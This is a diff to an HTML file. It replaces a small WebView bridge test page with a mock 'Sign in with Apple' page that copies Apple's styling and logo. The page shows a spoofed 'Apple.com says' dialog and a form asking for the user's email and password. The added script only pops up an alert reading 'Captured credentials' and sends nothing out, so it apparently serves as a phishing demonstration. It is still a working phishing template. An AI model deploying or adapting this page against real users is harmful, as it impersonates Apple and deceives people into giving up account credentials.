@@ -1,18 +1,120 @@
+
 <!DOCTYPE html>
-<html>
-  <head>
-    <style>
-      * {
-        font-size: 38px
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in with Apple</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap');
+
+    body {
+      font-family: 'SF Pro Display', Arial, sans-serif;
+      background-color: #f5f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-container {
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      width: 320px;
+      text-align: center;
+    }
+
+    h2 {
+      font-weight: 600;
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #1c1c1e;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 16px;
+      border: 1px solid #d1d1d6;
+      border-radius: 8px;
+      font-size: 16px;
+      outline: none;
+      transition: border 0.2s ease-in-out;
+    }
+
+    input:focus {
+      border-color: #007aff;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.2s ease-in-out, transform 0.1s ease;
+    }
+
+    button:hover {
+      background-color: #1c1c1e;
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .logo {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <h2>Sign in</h2>
+    <button id="appleBtn" onclick="showPrompt()">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
+      Sign in with Apple
+    </button>
+
+    <div id="credentialForm" class="hidden">
+      <input type="text" id="username" placeholder="Email or phone" />
+      <input type="password" id="password" placeholder="Enter your password" />
+      <button onclick="handleLogin()">Login</button>
+    </div>
+  </div>
+
+  <script>
+    function showPrompt() {
+      const proceed = confirm("Apple.com says:\nPlease enter your credentials here.");
+      if (proceed) {
+        document.getElementById('credentialForm').classList.remove('hidden');
+      } else {
+        alert("Sign-in cancelled.");
       }
-    </style>
-  </head>
-  <body>
-	<p><br><br><br><br>Data here:</p>
-    <script>
-		var code = document.createElement('code')
-		document.body.appendChild(code)
-		code.innerText = JSInterface.submit("testresult", "这是个什么hacked")
-    </script>
-  </body>
+    }
+
+    function handleLogin() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      alert("Captured credentials:\nUsername: " + username + "\nPassword: " + password);
+    }
+  </script>
+
+</body>
 </html>
